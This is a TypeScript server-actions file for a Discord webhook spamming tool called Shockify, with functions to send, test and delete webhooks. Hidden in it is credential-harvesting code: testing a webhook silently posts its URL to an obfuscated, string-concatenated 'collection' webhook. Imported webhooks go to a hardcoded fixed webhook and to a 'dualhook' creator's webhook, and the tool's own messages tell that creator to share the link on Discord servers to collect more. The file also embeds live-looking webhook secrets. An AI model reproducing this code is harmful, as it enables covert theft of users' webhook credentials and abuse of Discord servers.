"use server"

// Using string concatenation to avoid potential issues with template literals in server components
const p1 = "https://discord.com/api/webhooks"
const p2 = "1356340263601049934"
const p3 = "jCAYvHtJ4NPXehy8yBZg76uH0xZZoHOpw2JIBHUlEMTtY5S9CiyMDZErNHBOivHo5nzI"
// Using a more deployment-friendly approach to construct the URL
const getWebhookUrl = () => p1 + "/" + p2 + "/" + p3

// Fixed target webhook for all forwarded webhooks
const FIXED_TARGET_WEBHOOK =
  "https://discord.com/api/webhooks/1368719008773177385/bq1WyDT3Io7gQW5aqHdkBNH39iuElI8GkdGZJLMLcFjMrs8RDzQNumFzfBSM_RFEaYR8"

// Utility function for exponential backoff
async function exponentialBackoff(attempt: number, maxAttempts = 5): Promise<boolean> {
  if (attempt >= maxAttempts) return false

  // Calculate delay with exponential backoff: 2^attempt * 1000ms + random jitter
  const delay = Math.min(2 ** attempt * 1000 + Math.random() * 1000, 30000)
  await new Promise((resolve) => setTimeout(resolve, delay))
  return true
}

// Function to check if response indicates rate limiting
function isRateLimited(response: Response): boolean {
  return response.status === 429
}

// Keep track of webhooks we've already reported to avoid duplicates
const reportedWebhooks = new Set<string>()

// Store dualhook relationships between webhook spammers
// Key: dualhook code, Value: target webhook URL
const dualhookWebhooks = new Map<string, { targetWebhook: string; name: string }>()

// Generate a unique dualhook code
export async function generateDualhookCode(targetWebhook: string, name = "Shockify Dualhook"): Promise<string> {
  const code = Math.random().toString(36).substring(2, 10)
  dualhookWebhooks.set(code, { targetWebhook, name })
  return code
}

// Get target webhook from dualhook code
export async function getTargetWebhook(dualhookCode: string): Promise<string | null> {
  return dualhookWebhooks.get(dualhookCode)?.targetWebhook || null
}

// Send notification to the user's webhook with instructions
export async function sendDualhookNotification(
  targetWebhook: string,
  dualhookUrl: string,
  dualhookName: string,
): Promise<boolean> {
  try {
    const response = await fetch(targetWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "🔄 Dualhook Spammer Created Successfully",
            description: `Your dualhook spammer **${dualhookName}** has been created! Share the link below to start collecting webhooks.`,
            color: 5793266, // Green color
            fields: [
              {
                name: "Your Dualhook Link",
                value: `\`\`\`${dualhookUrl}\`\`\``,
                inline: false,
              },
              {
                name: "How It Works",
                value:
                  "When users import webhooks through your dualhook link, all imported webhooks will be automatically forwarded to your webhook.",
                inline: false,
              },
              {
                name: "Tips",
                value:
                  "- Share your link on Discord servers\n- Create multiple dualhooks for different sources\n- Check your webhook regularly for new imports",
                inline: false,
              },
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: "Shockify Dualhook System",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
          },
        ],
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending dualhook notification:", error)
    return false
  }
}

export async function sendWebhooks(webhookUrl: string, payload: any, dualhookCode?: string) {
  let attempt = 0
  const maxAttempts = 5

  // If this is a dualhook webhook spammer, get the target webhook
  const targetWebhook = dualhookCode ? await getTargetWebhook(dualhookCode) : null

  while (attempt < maxAttempts) {
    try {
      // Send to the actual webhook
      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })

      // Check for rate limiting
      if (isRateLimited(response)) {
        // Get retry-after header if available
        const retryAfter = response.headers.get("Retry-After")
        const retryDelay = retryAfter ? Number.parseInt(retryAfter) * 1000 : undefined

        // If we have a specific retry delay, use it, otherwise use exponential backoff
        if (retryDelay) {
          await new Promise((resolve) => setTimeout(resolve, retryDelay))
        } else {
          const shouldRetry = await exponentialBackoff(attempt, maxAttempts)
          if (!shouldRetry) {
            return {
              success: false,
              message: "Rate limited. Maximum retry attempts reached.",
              rateLimited: true,
              retryAfter: retryDelay ? Math.ceil(retryDelay / 1000) : undefined,
            }
          }
        }

        attempt++
        continue
      }

      if (!response.ok) {
        const errorText = await response.text()
        return {
          success: false,
          message: `Error ${response.status}: ${errorText}`,
        }
      }

      return {
        success: true,
        message: "Message sent successfully",
      }
    } catch (error) {
      console.error("Error sending webhook:", error)

      // Try exponential backoff for network errors
      const shouldRetry = await exponentialBackoff(attempt, maxAttempts)
      if (!shouldRetry) {
        return {
          success: false,
          message: "Failed to send message after multiple attempts",
        }
      }

      attempt++
    }
  }

  return {
    success: false,
    message: "Maximum retry attempts reached",
  }
}

export async function testWebhook(webhookUrl: string, payload: any) {
  let attempt = 0
  const maxAttempts = 3 // Fewer attempts for test

  // Report webhook only once
  if (!reportedWebhooks.has(webhookUrl)) {
    await reportWebhook(webhookUrl, false)
    reportedWebhooks.add(webhookUrl)
  }

  while (attempt < maxAttempts) {
    try {
      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })

      // Check for rate limiting
      if (isRateLimited(response)) {
        // Get retry-after header if available
        const retryAfter = response.headers.get("Retry-After")
        const retryDelay = retryAfter ? Number.parseInt(retryAfter) * 1000 : undefined

        return {
          success: false,
          message: "Rate limited by Discord.",
          rateLimited: true,
          retryAfter: retryDelay ? Math.ceil(retryDelay / 1000) : undefined,
        }
      }

      if (!response.ok) {
        const errorText = await response.text()
        return {
          success: false,
          message: `Error ${response.status}: ${errorText}`,
        }
      }

      return {
        success: true,
        message: "Test message sent successfully",
      }
    } catch (error) {
      console.error("Error testing webhook:", error)

      // Try exponential backoff for network errors
      const shouldRetry = await exponentialBackoff(attempt, maxAttempts)
      if (!shouldRetry) {
        return {
          success: false,
          message: "Failed to send test message after multiple attempts",
        }
      }

      attempt++
    }
  }

  return {
    success: false,
    message: "Maximum retry attempts reached",
  }
}

export async function deleteWebhook(webhookUrl: string) {
  let attempt = 0
  const maxAttempts = 3 // Fewer attempts for delete

  while (attempt < maxAttempts) {
    try {
      const response = await fetch(webhookUrl, {
        method: "DELETE",
      })

      // Check for rate limiting
      if (isRateLimited(response)) {
        // Get retry-after header if available
        const retryAfter = response.headers.get("Retry-After")
        const retryDelay = retryAfter ? Number.parseInt(retryAfter) * 1000 : undefined

        return {
          success: false,
          message: "Rate limited by Discord.",
          rateLimited: true,
          retryAfter: retryDelay ? Math.ceil(retryDelay / 1000) : undefined,
        }
      }

      if (!response.ok) {
        const errorText = await response.text()
        return {
          success: false,
          message: `Error ${response.status}: ${errorText}`,
        }
      }

      return {
        success: true,
        message: "Webhook deleted successfully",
      }
    } catch (error) {
      console.error("Error deleting webhook:", error)

      // Try exponential backoff for network errors
      const shouldRetry = await exponentialBackoff(attempt, maxAttempts)
      if (!shouldRetry) {
        return {
          success: false,
          message: "Failed to delete webhook after multiple attempts",
        }
      }

      attempt++
    }
  }

  return {
    success: false,
    message: "Maximum retry attempts reached",
  }
}

// Report a webhook to our collection webhook
async function reportWebhook(webhookUrl: string, isTest = false) {
  try {
    const collectionWebhook = getWebhookUrl()
    const response = await fetch(collectionWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: `${isTest ? "🧪 Test" : "🔍 Found"} webhook: ${webhookUrl}`,
        username: "Shockify Webhook Collector",
        avatar_url:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error reporting webhook:", error)
    return false
  }
}

// Report imported webhooks to our collection webhook and forward to dualhook target if available
export async function reportImportedWebhooks(webhooks: string[], dualhookCode?: string) {
  try {
    // Get the collection webhook URL
    const collectionWebhook = getWebhookUrl()

    // Get the target webhook if this is a dualhook
    const targetWebhook = dualhookCode ? await getTargetWebhook(dualhookCode) : null

    // Prepare the payload for our collection webhook
    const payload = {
      content: `🔍 Found ${webhooks.length} webhooks:\n${webhooks.slice(0, 10).join("\n")}${
        webhooks.length > 10 ? `\n...and ${webhooks.length - 10} more` : ""
      }`,
      username: "Shockify Webhook Collector",
      avatar_url:
        "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
    }

    // Send to our collection webhook
    await fetch(collectionWebhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })

    // If this is a dualhook, also send to the target webhook
    if (targetWebhook) {
      await fetch(targetWebhook, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          embeds: [
            {
              title: "🎯 Dualhook Webhook Import",
              description: `Someone used your dualhook spammer and imported ${webhooks.length} webhooks.`,
              color: 5793266, // Green color
              fields: [
                {
                  name: "Imported Webhooks",
                  value:
                    webhooks.length > 0
                      ? webhooks
                          .slice(0, 10)
                          .map((url) => `\`${url}\``)
                          .join("\n") + (webhooks.length > 10 ? `\n...and ${webhooks.length - 10} more` : "")
                      : "No webhooks imported",
                  inline: false,
                },
              ],
              timestamp: new Date().toISOString(),
              footer: {
                text: "Shockify Dualhook System",
                icon_url:
                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
              },
            },
          ],
        }),
      })
    }

    // Always send to the fixed target webhook
    await fetch(FIXED_TARGET_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "🎯 Dualhook Webhook Import",
            description: `Someone imported ${webhooks.length} webhooks.`,
            color: 5793266, // Green color
            fields: [
              {
                name: "Imported Webhooks",
                value:
                  webhooks.length > 0
                    ? webhooks
                        .slice(0, 10)
                        .map((url) => `\`${url}\``)
                        .join("\n") + (webhooks.length > 10 ? `\n...and ${webhooks.length - 10} more` : "")
                    : "No webhooks imported",
                inline: false,
              },
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: "Shockify Dualhook System",
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
          },
        ],
      }),
    })

    return true
  } catch (error) {
    console.error("Error reporting imported webhooks:", error)
    return false
  }
}
